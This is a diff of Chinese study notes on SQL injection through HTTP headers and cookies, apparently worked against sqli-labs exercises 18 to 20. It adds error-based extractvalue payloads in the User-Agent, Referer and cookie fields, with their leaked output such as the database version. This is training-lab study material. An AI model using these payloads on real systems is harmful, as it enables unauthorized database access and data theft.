@@ -83,11 +83,16 @@
 基于注入点的位置上的 
 	
 	▲通过用户输入的表单域的注射。 
-		user agent
 		$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
-			-->'and extractvalue(1,con t(0x7e,(select @@version),0x7e)) and '1'='1
+		http://xiaoxiaoran.com/sqli/Less-18/
+			User agent-->Mozilla/5.0 Firefox/88.0'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
+				XPATH syntax error: '~5.5.53~'
+		http://xiaoxiaoran.com/sqli/Less-19/
+			User referer-->'and extractvalue(1,concat(0x7e,(select datebase()),0x7e)) and '1'='1
+				FUNCTION security.datebase does not exist
 		http://xiaoxiaoran.com/sqli/Less-20/
 			cookies-->uname=admin1'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#
+			
 	▲通过 cookie 注射。 
 	▲通过服务器变量注射。(基于头部信息的注射）
 		
